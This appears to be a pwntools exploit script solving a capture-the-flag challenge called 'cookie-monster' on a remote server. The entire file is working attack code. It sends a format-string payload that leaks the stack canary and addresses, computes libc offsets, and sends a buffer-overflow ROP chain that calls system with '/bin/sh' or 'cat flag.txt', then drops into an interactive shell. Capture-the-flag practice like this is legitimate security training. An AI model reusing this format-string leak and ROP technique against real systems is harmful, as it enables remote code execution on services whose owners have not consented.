from pwn import *

#p = process("./cookie-monster")
p = remote("chals.damctf.xyz", 31312)

#pid = gdb.attach(p,gdbscript="b * bakery+226")
_format = "%6$p|%2$p|%15$p|%16$p"


p.sendlineafter('name: ',_format)
leak = p.recvline()[6:].split('|')
stack = int(leak[0],16)
stack = stack -0x3c
stdin = int(leak[1],16)

canary = int(leak[2],16)

libc = int(leak[3][:-1],16)

_bin_sh = stdin -0x59d31
exit = stdin -0x1a8110
exit_ = p32(exit)
system = stdin -0x19b2e0

#system = p32(system)
system = p32(0x8048440)
pad = "cat flag.txt\0"
pad += "a" * 19

rop = pad
rop += p32(canary)
rop += 'BBBB'

rop += 'DDDD'
rop +='CCCC'
rop += system
rop += exit_
rop += p32(_bin_sh)

print "binsh: ", hex(_bin_sh)

print "stdin: ", hex(stdin)

print "libc: ", hex(libc)

print "canary: ",hex(canary)

print "stack: ", hex(stack)

p.sendlineafter("purchase?\n",rop)




#print leak

p.interactive()
